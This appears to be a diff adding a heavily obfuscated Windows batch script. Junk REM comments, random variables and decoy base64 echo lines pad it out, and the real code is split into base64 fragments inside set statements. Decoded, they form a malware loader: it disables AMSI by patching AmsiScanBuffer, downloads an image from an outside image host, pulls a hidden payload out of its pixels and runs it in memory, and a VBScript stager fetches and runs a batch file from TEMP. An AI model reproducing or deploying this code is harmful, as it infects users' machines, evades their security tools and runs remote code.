+SE%TsnD%t "HWKAbF=LCiWBqKxrHRJNbCJzItpjCREI"
+REM fragment undergrowth binary vertex
+REM zenith circle zenith twilight clearing cipher guard kappa echo echo
+Se%tQFa%T "vsNPKWFLCpA=ofJHQKkhOaki"
+SE%rtAYL%t "wkNRLBlqa=OlwZTGebxafSEG"
+REM odyssey zenith shadow cipher binary lance valley vertex strobe
+SE%Qpoh%t "sfSocCzbehCHd=iaPcgLklemLQAthVRSwZVgPTIsQZs"
+REM ruby kappa ruby phantom undergrowth zenith fathom twilight sword binary
+sE%SSeo%T "DtAXTkiVYSuNXeJ=nTJEWZvPrpYVqukSgzTSIsVlFP"
+REM clearing circle circle
+sE%LXC%t "iqzPASI=EFQIBFOcfmXLcjzsTyEGhYyTOBHtqcNb"
+Se%ElfhV%T "SIxolQzZh=Db21wcmVzc2lvbi5HWmlwU3RyZWFtKCRjbXMsIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykKJG91dE1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtCiRncy5Db3"
+REM glimmer undergrowth mirage twilight beacon
+echo Q3ZFR0xha292MTJkZ2VEdXE4VkIyR2tVWjZNNWxvN1kwaG9TUVd1TmV3QVBsZ3RZZ250aks= >nul 2>&1
+SE%ARe%T "MPHWkcPhyeGs=nXNHffROWGZsJFsSPKQubRTChFurZqIfUYF"
+Se%ILAtj%T "TMqnenXApugz=FrrYCxbEAWvzTlEDEgQdTtJpzuT"
+echo aWJ0QjNhekViNWFFbGx0cVdYVE9jd0swYmt2S2JUY1BkSW9uOWt6cWhnMVFVcUhyeWhVMXVyQWQxT2phVXgxNEx5S3JmYWh5bjI= >nul 2>&1
+SE%BUyZg%T "WOojGOnQIBauaGk=TgjqWepVDJfCzqMtBAYRCdKfNuIRsUMuYw"
+Se%aEKH%T "NGkMSSVmQb=D0gInV0Zi04IiA6IC5PcGVuCi5Xcml0ZVRleHQgSHR0cC5yZXNwb25zZVRleHQKLlNhdmVUb0ZpbGUgdGVtcEZpbGUsIDIgOiAuQ2xvc2UKRW5kIFdpdGgKc2hlbGwuUnVuIENocigzNCkgJiB0ZW1wRmlsZSAmIENo"
+Se%zsXs%t "WdhVhUQGW=YDYXWUUyvpcuxXcFeYiBbBfuB"
+REM shadow clearing zenith vertex guard shadow strobe
+REM ruby hawk cipher kiln beacon fathom fragment kappa clearing
+echo NmUxYmhGenJ1S3RlbHJDdG53b3pYbXhObnlVYVF1YlBCcnFtMVg3aGM= >nul 2>&1
+REM glimmer binary undergrowth vision odyssey twilight strobe beacon clearing delta
+REM kiln mirage delta fathom odyssey sword ruby vision sword
+sE%TrKcH%T "ETWnNEmEhm=gp0ZW1wRmlsZSA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlXHVzZXIuYmF0IikKV2l0aCBDcmVhdGVPYmplY3QoIkFET0RCLlN0cmVhbSIpCi5UeXBlID0gMiA6IC5DaGFyc2V0I"
+Se%nCBK%T "JUfquomNvxjY=VSlgeiRhMHsovgdlSyRTzKgcKTQV"
+REM pixel mirage vision delta phantom pixel kappa lance hawk
+Se%jxIno%t "izLNEjvxEziB=eJEjBKwogPfdWC"
+echo OTlLZTR1UlR2cGgxdVIwSGpwMThiM1RkVHB3QXNDbk5WQ1RyN2tnVmcwTDZzWGg3M3RQQzBJd1FqeGxIcVh3N1BOWnQ4amVzblZsNw== >nul 2>&1
+se%KrV%T "oTpdHnAzkGdKAaQ=NJoEJVviXQwVLTrISco"
+SE%tSEAA%T "eftckl=NSUlWURCEklKLdyEjsLqJemozHtX"
+SE%sNQ%t "UlgNunqizNGQ=IbiXmbfJjGcWiyKUSkWkl"
+echo WUVGbTRTOWRuMGlhUEVOZkhYeXloQmplSG5CWE1wbnF4Y2FTWkI5NnZwc2hTaDZFMnNLOUxTajdMV1V3czJrT2s= >nul 2>&1
+REM phantom cipher lance echo vision
+Se%PMG%T "jPAakAhVHZ=PCTpjdckBcS"
+Se%rQU%T "jKqEqPfYjYG=AKzydZqEGpxjhotJ"
+REM twilight hawk kiln glimmer fragment sword fragment vision
+REM shadow fathom kappa circle circle fathom shadow glimmer
+REM strobe valley strobe zenith guard zenith echo
+REM kappa clearing undergrowth circle
+REM beacon twilight kappa core twilight undergrowth kiln undergrowth glimmer
+REM ruby lance undergrowth guard sword kappa cipher mirage
+echo T2pWU3N6b1hRZDdHUmxSTnlGVlJseU1haUd2V0JhV3JiV0FtUENEZmV4cjVJSFdkTmt4d3ExTTlST2JrNW5yUHZYc3VrNld2TXVMaQ== >nul 2>&1
+Se%lTw%T "beIXYVSWyfTsE=kfJxHXmhNWM"
+REM strobe core fragment hawk beacon
+sE%rgb%t "YkUpbMHdeULwApM=IvcAyHMtQUftmvDS"
+REM beacon beacon guard twilight fragment clearing mirage
+REM sword ruby strobe kiln phantom sword phantom valley
+echo V3BXR0pKZnRGaEFrclFucWNNTzFIT0lzcmh1M0dacnJBMjczWlpDVlpvVEQxSFlrcDZVTFJyWlZ6QlBYc3lhdXBUa2t4Tkw2RkhqUGNCdFE= >nul 2>&1
+SE%ccFIe%T "bjZzCGmEYutyJY=EccsJnqMIdgivDAbjLvgApNVZyQLqb"
+echo a21rdGlGTnFsdTNUOGVybHJ2cWRGS1B6Nk9XbWxieFBpZDdzMm5MU3lDQ1BHYW1sRkVZMVVxNA== >nul 2>&1
+Se%JXgjh%t "WICWDRdVpWJ=GjlOvrFTphdhONPXkhtYv"
+SE%vqxpe%T "WEYhrlgEsa=xRxsMaHgeAmeQeaFpS"
+Se%BXr%T "zZXnuJHT=ROQiTdZdsBhJzApXfgaeS"
+REM circle mirage ruby binary delta
+echo MW9wanlYR2M0UWhlYzBZYUVaVnVIVGw2bnJRZ25tTzhOM3dQS1NtN2JFZVRvYVRSVlRxQlhnTGN6S2UzRlU2TmQwcFZuUkR5NXhSRkZWWQ== >nul 2>&1
+REM strobe core lance kiln hawk kiln valley vision
+echo WG1wdDNXMjR4NHRLeHViR1V2WnI5UklGOWlZYmhuejBBTmo1OGJ0T2pqNnhIcUZtZk52M0xDdklJaDZXbTd5 >nul 2>&1
+REM phantom shadow odyssey
+REM beacon vision delta circle
+echo MkNodkxIMFNhUlhyNkQ5Y2pxeGpqSnpObVlqcGpUZTZXZzRSRDNqQjl6a1JPeEZT >nul 2>&1
+se%Bcn%T "SLaCztz=sKROrEJmnJUfLXSASENgSeQveDru"
+echo OHVtMkxTcmc3ejA3R2lWNXc0NjBzZ1hyZ2Z5Q1IxT1d5TE93SlVrWlJFU1RhQW9lUHZPUjV4RnV1VVhGSE9hbEtKcmlrbWg= >nul 2>&1
+REM vertex vertex binary core beacon sword kappa ruby undergrowth kiln
+SE%KBtoU%t "GULkGojO=orAXInuPDMLEO"
+se%WPNb%T "UbbJmHOTKfwM=0gJGFzc2VtYmx5VHlwZS5HZXRNZXRob2RzKFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdIlB1YmxpYyxTdGF0aWMiKSB8IFdoZXJlLU9iamVjdCB7CiRzdHIgPSAkXy5Ub1"
+REM lance beacon guard delta vertex clearing ruby kappa kappa ruby
+echo R2VCMVEwWWZhbkNGbko4Nzl5bXI0bkJiMEdTSVFsYWNGdlR1Zm9TcjZ1ZnRPVVpmUkdwWUNSUHh2c2NDSjZYODU= >nul 2>&1
+echo WVhRMkp3RVBIVXV3SHN6Rk4yUVZ4R29wM0NUb1k2bDdWTlpkR2lnUEpNYjZ4Uw== >nul 2>&1
+se%VzIzx%t "SYJGzvQ=TnQxBHRbioeJVerpht"
+se%WrR%t "evpBQGHxmL=cteUVGrgxUhvcpgxHGbp"
+REM mirage echo beacon fragment odyssey
+echo dmJ5UU1pM2UyckVwbEdRUHBOSVpka0NDOXI3aExSTnBjQ2VlQ1NTeFZ2cjJFVXEyZnJ1eDIyd0xCbUZHaWlTUmRhWXY= >nul 2>&1
+REM beacon undergrowth kiln delta strobe strobe pixel lance
+REM fragment fathom vertex fathom fragment clearing twilight delta
+SE%WMs%T "BusZrzYpfxMg=LngDqqVlhC"
+Se%Xzh%t "CyLWXbpmCFgE=ZnVuY3Rpb24gRGlzYWJsZS1BTVNJIHsKdHJ5IHsKJHAgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5NYW5pZmVzdE1vZHVs"
+REM phantom undergrowth core kappa clearing guard
+echo SGVLaUtXMlM4R3FUNzJKc2lzS2NWTkZMOU9CVjBYTUFHZTZPVVdwaDV4RzBSYWI2 >nul 2>&1
+echo WTZvY1hkYXhKMGx3dFhFMGNQOEJTRjFtMTNIa1JOMTBYUHRQNzZWaE5jWEZMbmYzMUY4blZK >nul 2>&1
+REM mirage beacon shadow
+echo aWVPU2Z2YjFLMVRiNk02Q2VwNHFNbzVGWkJIajBPQnIyUHlIN3FkdnRQMElRYTllcE1M >nul 2>&1
+REM strobe hawk mirage clearing vision delta
+REM circle clearing kappa guard fathom shadow mirage fathom core shadow
+sE%Dsii%t "iaiHgnDsVM=nCiRhc2IgPSAnQScgKyAnbScgKyAnc2knICsgJ1MnICsgJ2MnICsgJ2FuJyArICdCdScgKyAnZicgKyAnZmVyJwokaGFuZGxlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOj"
+REM core guard undergrowth pixel valley beacon
+REM glimmer kappa fathom circle shadow glimmer clearing beacon fathom zenith
+REM kiln zenith strobe lance twilight
+REM circle valley vision binary beacon lance
+REM sword ruby circle cipher
+sE%aVACP%T "GuGmViMTVvg=DhzfKOaZrfTfadJz"
+REM zenith valley clearing core valley cipher kiln binary beacon
+REM kappa strobe core glimmer circle vision strobe vertex fathom
+echo eTd3VlBzOTFFSnh0aVRmaVNIY2M1YnRLSWxZYW84UXB6SDBDNzZKZFpI >nul 2>&1
+Se%jOS%t "LELOBNdRfUlCIY=ITZzNfCQVa"
+REM echo zenith vertex
+SE%LWxvy%T "kARALxY=DXEIjmNDPfwQqelIltotv"
+se%ubpN%T "rmXMbXAjoZjN=SAkdHJ1ZTsgYnJlYWsgfQokZXh0cmFjdGVkLkFkZCgkcHguRyk7IGlmICgkZXh0cmFjdGVkLkNvdW50IC1nZSAkbGVuZ3RoKSB7ICRkb25lID0gJHRydWU7IGJyZWFrIH0KJGV4dHJhY3RlZC5BZGQoJ"
+echo Y215QkF5RTU1ZWMzMHNVNTliRGJvN0Q1WWpyS0VmOGFCMFJGQlA2anRneURsdjR6cld1SXdRRTQ= >nul 2>&1
+sE%iLy%t "TUjEdkeIIhY=kbnVsbCwgQCgsJHN0YXJyKSkKfQpMb2ctU2lsZW50ICJbK10gRW50cnlQb2ludCByZXR1cm5lZC4iICJHcmVlbiIKfSBlbHNlIHsKTG9nLVNpbGVudCAiTm8gRW50cnlQb2ludCBmb3VuZC4iICJXaGl0ZSIgJHRydWUKfQp9IGNhdGNoIH"
+se%VYRMa%t "TJCiEDie=umoHTrmiGwKWHaOeBLUJfy"
+echo cFk1NWx2N0dvMUdtRUZpcHg0YmVXUzNSN2xaNEEzajRQUm9iTlV2dFRiSGV1eEQ1bFRNa2dmcHFRV3NrYjhhSGpaT0lBN2Rwdk1zdzU= >nul 2>&1
+REM circle glimmer sword circle sword
+REM beacon beacon pixel glimmer lance fathom valley phantom delta vision
+SE%uGEnZ%T "RycmiuTWAH=Eh0dHAgPSBDcmVhdGVPYmplY3QoIldpbkh0dHAuV2luSHR0cFJlcXVlc3QuNS4xIikKSHR0cC5PcGVuICJHRVQiLCB1LCBGYWxzZQpIdHRwLlNlbmQKSWYgSHR0cC5TdGF0dXMgPSAyMDAgVGhlb"
+REM zenith fathom undergrowth delta lance undergrowth phantom guard phantom kappa
+REM odyssey hawk circle
+sE%dmNC%T "fdTosKK=vzgtVAhdgkwGMSKJulTwOD"
+REM mirage binary circle lance fragment kappa vertex fragment odyssey hawk
+REM zenith valley clearing echo clearing glimmer delta
+SE%lxaT%t "YrWxRRzADbKwnd=gJdaZimLCaPfDcNwygHEDnysghdKJ"
+SE%YJk%T "PhwzjotAxi=GVsc2UgewpMb2ctU2lsZW50ICJJbnZhbGlkIHNvdXJjZTogJFNvdXJjZSIgIldoaXRlIiAkdHJ1ZQpyZXR1cm4KfQokbXMgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0oLCRkY"
+echo VWJZRXVtZ0RjQVBVa0VOenpncE1aWnhyWFZCdWlsZFFPMWpUa0ZZT00weHRvdDhq >nul 2>&1
+se%OVzW%t "XcBMFmksnjIBL=xVECYAqrVefVXsIytUmgxH"
+REM odyssey fragment sword glimmer circle
+SE%Bexv%t "bDOoSdsala=pZsCCVJEbncSPrpmAUk"
+se%SSFH%t "RTkHBwPgMspd=hARDuWPvPWNAiOfI"
+REM clearing pixel circle ruby odyssey cipher fragment mirage
+REM ruby odyssey sword sword fragment odyssey kappa binary vision circle
+echo aG9MN0ZSTklscmV6QmF0QnZzY3gzejVqWW9TNFlkekF6cmdiWDlOdXFGdWVqelIxdjdU >nul 2>&1
+Se%bSIUl%T "ntURSfW=yHPYvwQEGqsuixvuitLeIAbx"
+REM strobe fathom delta kappa sword shadow zenith echo beacon
+se%MSWVa%t "tPZdNEL=QsIFtyZWZdJG9sZCkgfCBPdXQtTnVsbAp9Cn0gY2F0Y2ggeyB9Cn0KRGlzYWJsZS1BTVNJCiRJbWFnZVVSTCA9ICJodHRwczovL2kuaWJiLmNvLzhuSFpCTXNUL21lbS5wbmciCmlmICgtbm90ICR0YXJn"
+se%nhk%t "ymlvctGrqRdo=rWeWZItSmyee"
+REM binary twilight kappa delta guard
+SE%eoSn%t "hYqxOgMqjy=jVoIxCwMActqTCyPvGBGqwRe"
+echo UU82eXgwSVJjSUpHY0JDVU44cEJuN3FoSWQyakVjTGhyQTdPRmszaGg= >nul 2>&1
+sE%KFZq%T "PghjIZZidJy=ZKfiQkpXXbwu"
+SE%MmUbN%T "XpSHIoWYkff=cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYiKQokZGF0YSA9ICR3Yy5Eb3dubG9hZERhdGEoJFNvdXJjZSkKJHdjLkRpc3Bvc2UoKQp9IGVsc2VpZiAoVGVzdC1QYXRoICRTb3Vy"
+REM odyssey echo strobe glimmer twilight clearing vertex odyssey binary
+SE%GwEDN%t "fgncOS=FpycDUqsKkqCKnTFFGplvxsWMKCDEFC"
+SE%Vuxd%T "aacMRXapU=OVYwNJdMaahUHbyy"
+se%MLc%T "jbWacloY=UtyNoQzfVV"
+se%kxJsF%t "QcnmmvWZDQR=OQHKsZYuBrXPuuXdtk"
+sE%dbqKA%T "gcFqrBendlxk=b2luICIsIgokdmJzQ29udGVudCA9IEAiCkRpbSBzaGVsbCwgZnNvLCB0ZW1wRmlsZQpTZXQgc2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQpTZXQgZnNvID0gQ3JlYXRlT2JqZWN0KCJT"
+REM fathom kappa hawk mirage glimmer sword fragment circle
+SE%omfPc%T "ewUIrlUHSqPwK=LaRGERbQITXLYb"
+echo dTFIZ2JhdzBoUHJ2d29vNnd0a012ZEtFbG42NDB6SG5jWUJ3Smg2V0dOUms5bmFrajhqWUdnQmVNSw== >nul 2>&1
+SE%XwGT%T "oOetxKa=hoAVzeYqqHevqHJdVauzuHFPnOvUdMOAo"
+se%gve%T "IZAoGv=YcCIBEMUgPmAaTneoYkxWIJEQrjMs"
+echo eFRCSEZJQWdzcjRKRlRWcVNMUW1TVlV4YXl0R0FuY1ZSSDMxazhlNnh6UlpOdFpvRENHOXlUaGtKNUM= >nul 2>&1
+Se%roEQN%t "nfJWghSXyYa=DEyvuVqLezlyEjGzEXfUbBgZmiIMvN"
+REM vertex lance zenith valley mirage core delta hawk
+sE%AsRpM%t "VBlwIiC=jxPEcAHVUvj"
+echo cjVsMmlQc0N4WFg3Y1RTemJvY1U1a3RxWU9iOUx0OVM0c2ZlMnh0YklGaW04M3pZSFNHVHQ2Y3V4OWNw >nul 2>&1
+REM cipher hawk kappa vision echo kiln undergrowth binary glimmer
+SE%XaF%t "IPptDvJh=hbiIKaWYgKCRlbnRyeS5HZXRQYXJhbWV0ZXJzKCkuQ291bnQgLWVxIDApIHsKJGVudHJ5Lkludm9rZSgkbnVsbCwgJG51bGwpCn0gZWxzZSB7CiRzdGFyciA9IFtzdHJpbmdbXV1AKCkKJGVudHJ5Lkludm9rZSg"
+REM odyssey kiln circle core echo clearing
+REM kappa kappa pixel guard guard pixel zenith vertex clearing echo
+se%ZlXz%T "PWQXcHXHEMpS=zXFeqDhFWqvGvZuxMDAUKPXzY"
+echo YWxMQ0lBbUxEajJ4VkhNWDJSMU1YZkZzV1pCSHRTM25PczZqYUpEcWhKWU9rbkdlcklzd00= >nul 2>&1
+REM kiln clearing glimmer circle
+SE%tXy%t "XrEPNMZgqvIXRl=CDJLCwNvWoDYZxXpVXoSMtUkKrLnraeuCIr"
+sE%mEs%T "oUrPZzeXKexvs=AWPADHbEkUHCBChrkGIvprl"
+REM ruby kappa fathom delta ruby fragment shadow vision clearing undergrowth
+SE%EdnPD%T "SePSkuEr=BgyndZGjGJvSItfsANpyebQPohTLOfsy"
+se%Twds%t "jnfLxeamcGJ=GJTjJqjeUOnMdKNDUyBuWhr"
+REM guard zenith kiln beacon binary valley odyssey
+SE%uxUwZ%t "XCFPgWs=tGNiQVxRxkSboPZBKoLgmluGuB"
+REM kappa vertex sword lance echo valley beacon odyssey vertex
+sE%ZUA%T "hrSOYRNwq=VYumlBuuWUwBgFQQZlgDYZIiBjatNB"
+REM hawk guard clearing delta twilight valley odyssey kiln
+echo Q1RobVUxSTB1d3NKcHFKUWc2dEc5dUlWRW52VlBJaEVaVzVqTkJQMDFHb1FNcGRtcUFPak5vdzJwcmZyUjMxMERZUkgz >nul 2>&1
+sE%bIog%T "dloPzJWCCQdQ=rQNMIoGtWBGrJCHVBHNEZb"
+echo VEFFRmdYZnlXWnBoQUV5SnR4ajdORFd6YW9sc3I5dWlTVmw1enlqS2tCT3B1QWJ6dDhWdHRzYlh4N3pGUnBjMWxneA== >nul 2>&1
+REM shadow sword fragment valley ruby clearing echo undergrowth
+REM shadow kiln circle core fathom guard shadow binary delta strobe
+sE%NYCl%t "deVlvogcbEEJO=ZEtkphqsTvljCjvGdfteQKdsLHqAqd"
+se%djqIM%t "tSQhsWSWk=GHOOGxrjKjFhE"
+sE%dpnZg%T "TuJTMaqLpyIZyd=HzwoZFKFHKEShrIjhItdsUueWDBmuJ"
+echo Sk9tN3NjbW9CcTJhWnBmVWVISzdKUkhDek1rRUVTOHdCbDltSVcyQWRFYmdiUmxvd2NKRDdIaklSSg== >nul 2>&1
+REM clearing ruby zenith pixel lance kappa cipher
+sE%jYP%t "pBKGnxaqlMBsgw=CwhOTUCRJjcOjbicFEqKisKYEo"
+Se%SBnIb%t "PdpMRDtJT=MOawcKfaoQAyYbLfIfMIw"
+SE%Pok%t "qcjzshMXUNMmV=eHxgzXXqPADUXwc"
+REM hawk strobe vision sword phantom ruby glimmer clearing circle
+se%dLv%T "kmkYxfMWQzO=KQDNnNsPlObRcLScIrbcUTlaERLRErnKWV"
+REM shadow kiln kiln beacon mirage
+echo Z3ViakZzaFVrUjNGMlhKUmhlMUVteTQxV3FOT1ZBMUlQSFUwcVZSNWhHbTZiUnBjMTdNSTVSTTRkOVcyNm1KUTdkRGhMU0E= >nul 2>&1
+REM strobe undergrowth phantom clearing echo odyssey echo twilight ruby
+REM cipher strobe undergrowth valley cipher twilight
+REM vertex kiln pixel echo sword
+REM fragment beacon valley
+echo Wm1tWWhJdXdma2VMTlEycG16eUNMYlpFN2dHMXRxU09CZUN6M0I5R21sUUQwUTNSMjRIVDVmNDFVb0l1NWp2WENXZmVVQ0VraA== >nul 2>&1
+Se%hFIO%t "OTSJGgb=VtJDcuCIqroQZGCWAkPdRihLHewMifnEITv"
+se%iyAzZ%t "sPCPGQZDYLGlcb=rVCuOlfYvwDkSvdhlnSxxFpLvgy"
+echo OHUwN3NsVkk1NUhSOVdPbG1ORE1SdlNTOWpvVGt4ZXd4SmxYUXlRYTRJalFsNDl0cDM5MEJkVmswSDdISk9H >nul 2>&1
+REM core fathom cipher fathom fragment ruby
+Se%wgyHr%t "RBUtwU=thFWKODrmSKSrlCnMurAakMpwfqTattZH"
+se%Ttf%T "BZnFzsuEcblYw=lijFPLpRIVZxccDlyRRHRp"
+REM fragment glimmer binary circle kappa strobe odyssey cipher circle
+echo OTM1Q1V5amhVOFBrU05PSVpPOGJxM0RnNzB0ajByWWduMjd1ZDlGU2x2OThNSjBMQnptdmw0QTQyUEFTdGlaZFk2RXcyQQ== >nul 2>&1
+REM cipher odyssey shadow vision echo core ruby sword
+Se%DdRy%T "GEEkUuZSCptk=ZXEgMCAtb3IgJHggLWVxIDEpKSB7IGNvbnRpbnVlIH0KJHB4ID0gJGJtcC5HZXRQaXhlbCgkeCwgJHkpCiRleHRyYWN0ZWQuQWRkKCRweC5SKTsgaWYgKCRleHRyYWN0ZWQuQ291bnQgLWdlICRsZW5ndGgpIHsgJGRvbmUgP"
+se%FvA%t "HNJFzrjmkuaCNM=ozzCSqgXgEPbKbMWe"
+sE%tHdY%T "NMOlLaB=dOTBePbDubTgLNPLFSw"
+REM undergrowth hawk shadow core echo twilight hawk kiln
+echo TTZWTHc5eks1VzY5SllaNlNCaVAySHd3QkhONWlVUVFiaWlwRmx4VFlMQVB6eXh2cWNmNUhSeENEbzNoSW5TQzhSMVVU >nul 2>&1
+SE%tzoDx%t "IhXQInfAAc=PdCBnYwNfUDiLsOGsGwKdvnEOHGesd"
+SE%vghb%t "oclbIV=fQeIVFlrwxahUqXFnmnkob"
+REM cipher kappa beacon valley binary kappa sword core phantom
+echo MjlLUzlUMzZCeHpsS2YxOGE2Sjhrb2lMOTl6WENzYUlRVkNPaVBOcW9nOG85MEJYWEVCVHpXWg== >nul 2>&1
+REM odyssey fathom clearing
+Se%FdQ%t "aLmhhkwz=JdRkeNwAnnAj"
+REM core fragment ruby
+sE%eoRIS%T "bSkfSX=XROkioSokGZhGXGYIfTBdvRPaMXhM"
+sE%UPS%t "LbBZKF=gp9CkxvZy1TaWxlbnQgIlsqXSBFbmNvZGluZyBzdGFnZXIgVVJMIGZvciBWQlMuLi4iICJHcmF5IgokY2hyQXJyYXkgPSAoJFN0YWdlclVybC5Ub0NoYXJBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyBbaW50XSRfIH0pIC1q"
+Se%rPz%t "yPYZDRGkAHlxamt=xezMKBelcuZKkloWPnBILTcxLmuak"
+se%eiT%t "sYUcrsaSmqD=fOmmYjljTio"
+REM cipher binary echo fathom vision ruby delta mirage delta
+REM lance ruby clearing fathom valley ruby twilight cipher
+sE%tWwbX%T "vYsTMtLht=3BhLCBbRnVuY1tJbnRQdHIsIFVJbnRQdHIsIFVJbnQzMiwgW3JlZl1VSW50MzIsIGJvb2xdXSkKaWYgKCR2cC5JbnZva2UoJHB0ciwgW3VpbnRwdHJdJHBhdGNoLkxlbmd0aCwgMHg0MCwgW3JlZl0kb2xkKSkgewpbUnVud"
+REM binary fragment delta vertex odyssey vertex kiln fragment
+echo RVViV0xnY2FSQzRmM0dHdXBTZkdtQUZKQVFTYTZkNmhhNGRReFdkclk4cGIwZ0Q0WENwaFhFaVM3RGRyMzdFWDYwZE16MzA= >nul 2>&1
+se%vvBkN%t "sTZhtlB=ClhcACjVsWfOwsS"
+echo RXNnR0xudVRNbjFvMFVSYldNYzQxcUxiWEdlU21naVdZZ3Y5UUE3M2ZHNHowTk9qT0xvSDJHMHBrb3FwWUVFQVc5Y1BKU0FQOFRWNGkx >nul 2>&1
+echo M20yOWhMRDJLTExiR01uYnlVb3V0WmtsT2ZYQmE3bGp5ZVdlcUpPZUJ6bkhHSXlsRGNPSk8wOTNJellYenNKRk0yeWdrT3MzT3B2Mg== >nul 2>&1
+REM kappa glimmer phantom clearing kappa vision
+REM binary kiln twilight circle clearing vertex clearing twilight undergrowth valley
+SE%BjynG%T "DGXmkOEI=dIzLHkNDzXXxFLB"
+se%WUch%T "XfeDPzLPWnzRg=gulNQXwwItwOHgGjbYYAdQzRFzQPPNH"
+echo eHltYXRTb2tKbnZ1RGdKSGtMcFJZME9RZ1U0eVppb1drbGxrdk9MSkZydzU2aUZnc05uUE93SVBFWg== >nul 2>&1
+echo b1NVVk1MSnZqblZPZW5pOVY3WWJIYkY5SmFnWklIYnNwZ1pxaThKeURMeEZKc1NZMEhISFZqVnJxTXRKb09xNw== >nul 2>&1
+SE%UpDi%T "fgBdCOGHNkjB=dOVlHPvmDZFXNXq"
+SE%YJBsf%t "dklrtBHVQ=mhTOjGdRqgcNiVJXnFLkUmleZlrjI"
+REM zenith circle pixel
+se%zUf%T "LYyGQgGZppR=nLKddWBEzBByOdOtZTr"
+REM ruby undergrowth zenith fragment strobe circle vision valley
+Se%fCHTZ%T "VNcnfxbGUq=QAOQqdctwvrVYQONYPcNq"
+echo ZEd5VUVwV2pKTEJ3TjNkeXlqdWZEd3RUTGFuME1YVHZ0QzMxVGt2NkR2bzZOVmMw >nul 2>&1
+REM clearing kiln vertex valley guard guard undergrowth
+REM echo strobe odyssey mirage valley
+SE%eygl%T "JDYnUAOBRTzHs=bWoBXeYDmAm"
+se%jKMDe%T "KQXbJgcwRrtVQFv=ooWqwnlyANUwLMJJWIpEutyna"
+Se%vpGJM%t "LPkKOYpzqtTNWC=uoqjmRAVAkNbEsGSAbeiJhhcbnHK"
+REM kiln pixel core mirage kappa ruby core binary
+Se%vvSjy%T "FieDMjvBfPXTcf=NIypCtDJwEiEjyxvWWTDxyJzcTqrGe"
+REM circle sword odyssey echo echo phantom hawk vertex
+Se%pyFq%T "JkRfeTv=zJPPoTojuUbxekfarqXhRyGCtBJFYT"
+echo Y3dWMkIxUVRpNmNPMjh4elRUSU1WempGWnowWG9PZm16bmdkc1BFQ2psYVpYOWVpM3hlVmlnZFFlY3Q4S3p4Z1ZKQWZBUkFqWU84MERwMg== >nul 2>&1
+REM kiln delta clearing odyssey kiln clearing kiln pixel binary odyssey
+Se%nhwe%T "IfLuBmRccex=OQqseFSzKFSGemLRXNIQ"
+SE%hpWLz%T "qYirMpXteYako=vouOYFfXZxYKKHUVdN"
+echo TkVvelhBUHVEeWxFNFFybHNLN2NGdE9iMlVoS201QnVIOTZvcTFXYTV3Y09OTVl2VUh6V21ycENGVEhJdQ== >nul 2>&1
+REM hawk circle sword
+echo QkJ2Z3FaMjhYS2pHNXRUY1B5RFM5RHZrb0xlS2dDZVNCMDVwZEpWYmlqQW0= >nul 2>&1
+Se%mdRfE%t "WUytyYfSjSsXsK=WPAHLEfaEdyzczPLygPmwkRDrBXKS"
+se%RvRR%t "yLvnvfAZDNaa=JrikGjSWQDyLeGIBK"
+echo Rks5UlFpRnlEM2lNQThJTVZzYzV6bnlHWTlvV1pqemdjUGRPQXQyQWcxTGRJSGhtTHMxb0p1ZWlOdkJiRw== >nul 2>&1
+REM delta valley zenith shadow twilight lance circle mirage vertex
+REM twilight circle beacon lance core echo
+REM glimmer odyssey lance zenith fathom valley ruby
+SE%Tgiyl%t "EkTAjxwpD=vSqUOIYjibZsJkTKzpbz"
+REM twilight circle kappa kappa kiln
+REM odyssey hawk core circle
+sE%gueXn%t "thnrnoq=hvaTwdxmWjyxCjXrlnjDidvbziXWqwSZ"
+sE%ZOvr%T "kPSHTqJWiNqqA=FDyqfohkTVUjjSfG"
+sE%OwG%T "VHkYLOnh=vciBbdWludDMyXSRwMS5SCkxvZy1TaWxlbnQgIlsrXSBFeHRyYWN0ZWQgUGF5bG9hZCBMZW5ndGg6ICRsZW5ndGggYnl0ZXMiCiRleHRyYWN0ZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN"
+Se%DWkXS%t "ApvMFRT=fpDMIuuCRyYqHqUNAvcZ"
+echo eFoxa1BMRHBHSU5EeFhUeVMxZXlPaGxJaWZ4bkdEUERGOVN5VVFLUmtMb1lFZ1Jxa2tORVIxWA== >nul 2>&1
+sE%xeTT%T "wZTuho=nEWMpfxVcxgiW"
+sE%JMl%t "KkGcerAICiUzkpb=jiglxImwrWgFGkTYxJ"
+REM hawk core delta phantom fragment hawk phantom
+sE%Gxmyn%T "ZdDZrL=MqbygEArQMxbpwJFlIBCM"
+REM kiln phantom vision phantom undergrowth vertex phantom
+sE%OSpAg%t "QxRafA=RQhyOqBltfuDlqtMnWEXSDBrrdhWZATDyp"
+REM core vertex clearing odyssey vision kappa
+SE%maNXP%t "BJxYiGwX=AivKsAlQocQRokyGadgB"
+REM sword beacon twilight kiln glimmer
+REM echo glimmer zenith kappa circle phantom undergrowth
+REM strobe binary sword sword clearing circle
+REM binary shadow shadow binary fathom twilight guard
+SE%GMbp%t "QwRtDRCBBlxd=BmrRDDAPRlYWQSpyMzUr"
+echo b2VhUHRDVkl5NHhwVXFZdGltb3NlaUpibEx2UUdCQ1VCd2hBcVoxVXF6Q0V2VGtSb09TSUo= >nul 2>&1
+echo d1JOdG5TS2Nhc2R3enF1dmlTUzNwbjV3QWVsVzVDWTFuclAzd0VqZ1U2Z2NMVmVvYTF1b1VqOHAxWXlhb1E5VHBLYVQ= >nul 2>&1
+REM delta phantom pixel lance zenith kappa glimmer
+echo akNKMmo1N0lFRGdVUnU3c004cHdvTzAybUlyc3E1b2pYVElzSmRIRUg2TEVWOE56YUhOa3VK >nul 2>&1
